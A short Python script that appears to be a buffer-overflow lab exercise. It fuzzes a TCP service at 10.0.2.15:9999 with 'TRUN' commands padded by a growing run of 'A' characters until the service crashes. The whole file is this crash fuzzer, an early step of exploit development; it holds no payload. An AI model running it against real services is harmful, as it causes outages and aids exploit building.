import socket
from time import sleep
import sys


number_of_characters = 100
stringToSend = "TRUN /.:/" + "A" * number_of_characters

while True:
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_socket.connect(("10.0.2.15",9999))
        bytes = stringToSend.encode(encoding="latin1")
        my_socket.send(bytes)
        my_socket.close()

        stringToSend = stringToSend + "A" * number_of_characters
        sleep(1)

    except KeyboardInterrupt as e:
        print("Crashed..." + str(len(stringToSend)))
        sys.exit()
    except Exception as e:
        print("Crashed..." + str(len(stringToSend)))
        print(e)
        sys.exit()